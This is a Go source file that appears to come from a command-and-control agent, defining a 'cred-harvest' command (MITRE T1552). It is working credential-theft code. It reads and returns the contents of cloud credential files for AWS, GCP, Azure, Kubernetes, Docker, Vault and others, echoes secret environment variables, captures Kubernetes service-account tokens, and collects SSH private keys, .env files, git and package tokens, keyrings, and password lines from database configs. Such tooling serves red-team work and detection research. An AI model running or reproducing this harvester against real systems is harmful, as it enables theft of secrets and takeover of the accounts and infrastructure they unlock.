package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type CredHarvestCommand struct{}

func (c *CredHarvestCommand) Name() string        { return "cred-harvest" }
func (c *CredHarvestCommand) Description() string { return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)" }

type credHarvestArgs struct {
	Action string `json:"action"` // shadow, cloud, configs, windows, all
	User   string `json:"user"`   // Filter by username (optional)
}

func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		actions := "shadow, cloud, configs, all"
		if runtime.GOOS == "windows" {
			actions = "cloud, configs, windows, all"
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: parameters required. Actions: %s", actions),
			Status:    "error",
			Completed: true,
		}
	}

	var args credHarvestArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return credHarvestDispatch(args)
}

// Cloud credential file locations — cross-platform
var cloudCredPaths = []struct {
	name    string
	paths   []string
	envVars []string
}{
	{
		name: "AWS",
		paths: []string{
			".aws/credentials",
			".aws/config",
		},
		envVars: []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_PROFILE", "AWS_DEFAULT_REGION"},
	},
	{
		name: "GCP",
		paths: []string{
			".config/gcloud/credentials.db",
			".config/gcloud/access_tokens.db",
			".config/gcloud/application_default_credentials.json",
			".config/gcloud/properties",
		},
		envVars: []string{"GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_PROJECT", "CLOUDSDK_CORE_PROJECT", "GOOGLE_CLOUD_PROJECT"},
	},
	{
		name: "Azure",
		paths: []string{
			".azure/accessTokens.json",
			".azure/azureProfile.json",
			".azure/msal_token_cache.json",
			".azure/clouds.config",
			".azure/service_principal_entries.json",
		},
		envVars: []string{"AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID", "ARM_CLIENT_SECRET"},
	},
	{
		name: "Kubernetes",
		paths: []string{
			".kube/config",
		},
		envVars: []string{"KUBECONFIG", "KUBERNETES_SERVICE_HOST"},
	},
	{
		name: "Helm",
		paths: []string{
			".config/helm/repositories.yaml",
			".config/helm/registry/config.json",
		},
		envVars: []string{"HELM_REGISTRY_CONFIG"},
	},
	{
		name: "Docker",
		paths: []string{
			".docker/config.json",
		},
		envVars: []string{"DOCKER_HOST", "DOCKER_CONFIG", "DOCKER_REGISTRY_TOKEN"},
	},
	{
		name: "GitHub CLI",
		paths: []string{
			".config/gh/hosts.yml",
		},
		envVars: []string{"GITHUB_TOKEN", "GH_TOKEN", "GITHUB_ENTERPRISE_TOKEN"},
	},
	{
		name: "GitLab CLI",
		paths: []string{
			".config/glab-cli/config.yml",
		},
		envVars: []string{"GITLAB_TOKEN", "GITLAB_PRIVATE_TOKEN", "CI_JOB_TOKEN"},
	},
	{
		name: "Terraform",
		paths: []string{
			".terraformrc",
			".terraform.d/credentials.tfrc.json",
		},
		envVars: []string{"TF_VAR_access_key", "TF_VAR_secret_key", "TF_TOKEN_app_terraform_io"},
	},
	{
		name: "Vault (HashiCorp)",
		paths: []string{
			".vault-token",
		},
		envVars: []string{"VAULT_TOKEN", "VAULT_ADDR", "VAULT_ROLE_ID", "VAULT_SECRET_ID"},
	},
	{
		name: "DigitalOcean",
		paths: []string{
			".config/doctl/config.yaml",
		},
		envVars: []string{"DIGITALOCEAN_ACCESS_TOKEN", "DO_API_TOKEN"},
	},
	{
		name: "Heroku",
		paths: []string{
			".netrc",
		},
		envVars: []string{"HEROKU_API_KEY"},
	},
	{
		name: "OpenStack",
		paths: []string{
			".config/openstack/clouds.yaml",
			".config/openstack/clouds-public.yaml",
		},
		envVars: []string{"OS_PASSWORD", "OS_AUTH_URL", "OS_TOKEN"},
	},
	{
		name: "Pulumi",
		paths: []string{
			".pulumi/credentials.json",
		},
		envVars: []string{"PULUMI_ACCESS_TOKEN"},
	},
}

func credCloud(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Cloud & Infrastructure Credentials\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	for _, cred := range cloudCredPaths {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cred.name))
		found := false

		for _, home := range homes {
			for _, relPath := range cred.paths {
				path := filepath.Join(home, relPath)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				if info.Size() < 10240 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						if len(content) > 2000 {
							content = content[:2000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
					}
				}
			}
		}

		for _, env := range cred.envVars {
			if val := os.Getenv(env); val != "" {
				found = true
				display := val
				if len(display) > 40 {
					display = display[:20] + "..." + display[len(display)-10:]
				}
				sb.WriteString(fmt.Sprintf("  [ENV] %s=%s\n", env, display))
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	// Kubernetes in-pod service account token detection
	credCloudK8sServiceAccount(&sb)

	// AWS SSO/CLI cache scanning
	credCloudAWSCache(&sb, homes)

	// GCP service account JSON files
	credCloudGCPServiceAccounts(&sb, homes)

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func credCloudK8sServiceAccount(sb *strings.Builder) {
	saDir := "/var/run/secrets/kubernetes.io/serviceaccount"
	tokenPath := filepath.Join(saDir, "token")
	if data, err := os.ReadFile(tokenPath); err == nil {
		sb.WriteString("--- Kubernetes Service Account (In-Pod) ---\n")
		sb.WriteString(fmt.Sprintf("  [TOKEN] %s (%d bytes)\n", tokenPath, len(data)))
		token := string(data)
		if len(token) > 200 {
			token = token[:100] + "..." + token[len(token)-50:]
		}
		sb.WriteString(fmt.Sprintf("  Value: %s\n", token))

		// Also grab namespace and CA cert
		if ns, err := os.ReadFile(filepath.Join(saDir, "namespace")); err == nil {
			sb.WriteString(fmt.Sprintf("  Namespace: %s\n", strings.TrimSpace(string(ns))))
		}
		if ca, err := os.Stat(filepath.Join(saDir, "ca.crt")); err == nil {
			sb.WriteString(fmt.Sprintf("  CA Cert: %s (%d bytes)\n", filepath.Join(saDir, "ca.crt"), ca.Size()))
		}
		sb.WriteString("\n")
	}
}

func credCloudAWSCache(sb *strings.Builder, homes []string) {
	found := false
	for _, home := range homes {
		// SSO cache
		ssoDir := filepath.Join(home, ".aws", "sso", "cache")
		if entries, err := os.ReadDir(ssoDir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".json") {
					if !found {
						sb.WriteString("--- AWS SSO/CLI Cache ---\n")
						found = true
					}
					path := filepath.Join(ssoDir, entry.Name())
					info, _ := entry.Info()
					if info != nil {
						sb.WriteString(fmt.Sprintf("  [SSO] %s (%d bytes)\n", path, info.Size()))
						if info.Size() < 4096 && info.Size() > 0 {
							if data, err := os.ReadFile(path); err == nil {
								content := string(data)
								if len(content) > 500 {
									content = content[:500] + "..."
								}
								sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
							}
						}
					}
				}
			}
		}

		// CLI cache
		cliDir := filepath.Join(home, ".aws", "cli", "cache")
		if entries, err := os.ReadDir(cliDir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".json") {
					if !found {
						sb.WriteString("--- AWS SSO/CLI Cache ---\n")
						found = true
					}
					path := filepath.Join(cliDir, entry.Name())
					info, _ := entry.Info()
					if info != nil {
						sb.WriteString(fmt.Sprintf("  [CLI] %s (%d bytes)\n", path, info.Size()))
					}
				}
			}
		}
	}
	if found {
		sb.WriteString("\n")
	}
}

func credCloudGCPServiceAccounts(sb *strings.Builder, homes []string) {
	found := false
	for _, home := range homes {
		gcloudDir := filepath.Join(home, ".config", "gcloud")
		if entries, err := os.ReadDir(gcloudDir); err == nil {
			for _, entry := range entries {
				name := entry.Name()
				// Look for service account key files
				if strings.HasSuffix(name, ".json") && name != "properties" {
					if strings.Contains(name, "service_account") || strings.Contains(name, "adc") {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						path := filepath.Join(gcloudDir, name)
						info, _ := entry.Info()
						if info != nil {
							sb.WriteString(fmt.Sprintf("  [KEY] %s (%d bytes)\n", path, info.Size()))
							if info.Size() < 4096 && info.Size() > 0 {
								if data, err := os.ReadFile(path); err == nil {
									content := string(data)
									if len(content) > 1000 {
										content = content[:1000] + "..."
									}
									sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
								}
							}
						}
					}
				}
			}
		}

		// Legacy credentials directory
		legacyDir := filepath.Join(gcloudDir, "legacy_credentials")
		if entries, err := os.ReadDir(legacyDir); err == nil {
			for _, entry := range entries {
				if entry.IsDir() {
					tokenFile := filepath.Join(legacyDir, entry.Name(), "singlestore_refresh_token")
					if info, err := os.Stat(tokenFile); err == nil {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						sb.WriteString(fmt.Sprintf("  [LEGACY] %s (%d bytes)\n", tokenFile, info.Size()))
					}
					adcFile := filepath.Join(legacyDir, entry.Name(), "adc.json")
					if info, err := os.Stat(adcFile); err == nil {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						sb.WriteString(fmt.Sprintf("  [LEGACY] %s (%d bytes)\n", adcFile, info.Size()))
					}
				}
			}
		}
	}
	if found {
		sb.WriteString("\n")
	}
}

// Application config patterns — cross-platform
var configPatterns = []struct {
	name     string
	patterns []string
}{
	{"Environment Files", []string{".env", ".env.local", ".env.production"}},
	{"SSH Private Keys", []string{
		".ssh/id_rsa", ".ssh/id_ecdsa", ".ssh/id_ed25519", ".ssh/id_dsa",
	}},
	{"Git Credentials", []string{
		".git-credentials",
		".gitconfig",
	}},
	{"NPM/Pip/Gem Tokens", []string{
		".npmrc",
		".pypirc",
		".gem/credentials",
	}},
}

func credConfigs(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Application Credentials & Configs\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// Common cross-platform patterns
	allPatterns := configPatterns

	// Add platform-specific patterns
	if runtime.GOOS != "windows" {
		allPatterns = append(allPatterns, struct {
			name     string
			patterns []string
		}{
			"GNOME Keyring", []string{
				".local/share/keyrings/login.keyring",
				".local/share/keyrings/user.keyring",
				".local/share/keyrings/default.keyring",
			},
		})
	}

	// Database config files
	allPatterns = append(allPatterns, struct {
		name     string
		patterns []string
	}{
		"Database Configs", []string{
			"config/database.yml",
			"wp-config.php",
			"settings.py",
			"application.properties",
			"appsettings.json",
			"config.json",
		},
	})

	for _, cfg := range allPatterns {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cfg.name))
		found := false

		for _, home := range homes {
			for _, pattern := range cfg.patterns {
				path := filepath.Join(home, pattern)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				if info.Size() < 4096 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						if len(content) > 1000 {
							content = content[:1000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
					}
				}
			}
		}

		// System-level database configs (Unix only)
		if cfg.name == "Database Configs" && runtime.GOOS != "windows" {
			systemPaths := []string{
				"/etc/mysql/debian.cnf",
				"/etc/postgresql/*/main/pg_hba.conf",
				"/var/lib/mysql/.my.cnf",
				"/etc/redis/redis.conf",
				"/etc/mongod.conf",
			}
			for _, pattern := range systemPaths {
				matches, _ := filepath.Glob(pattern)
				for _, path := range matches {
					info, err := os.Stat(path)
					if err != nil {
						continue
					}
					found = true
					sb.WriteString(fmt.Sprintf("  [SYSTEM] %s (%d bytes)\n", path, info.Size()))
					if info.Size() < 4096 && info.Size() > 0 {
						if data, err := os.ReadFile(path); err == nil {
							for _, line := range strings.Split(string(data), "\n") {
								lower := strings.ToLower(line)
								if strings.Contains(lower, "password") || strings.Contains(lower, "secret") || strings.Contains(lower, "token") || strings.Contains(lower, "key") {
									sb.WriteString(fmt.Sprintf("    %s\n", strings.TrimSpace(line)))
								}
							}
						}
					}
				}
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func credIndentLines(s string, prefix string) string {
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if line != "" {
			lines[i] = prefix + line
		}
	}
	return strings.Join(lines, "\n")
}
